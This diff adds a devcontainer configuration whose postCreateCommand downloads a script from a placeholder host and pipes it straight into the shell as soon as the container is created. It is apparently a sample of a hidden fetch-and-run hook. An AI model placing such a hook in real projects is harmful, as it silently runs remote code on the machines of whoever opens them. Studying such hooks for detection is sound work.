@@ -1,0 +1,5 @@
+{
+  "name": "demo",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "postCreateCommand": "wget -qO- https://example.invalid/d.sh | sh"
+}
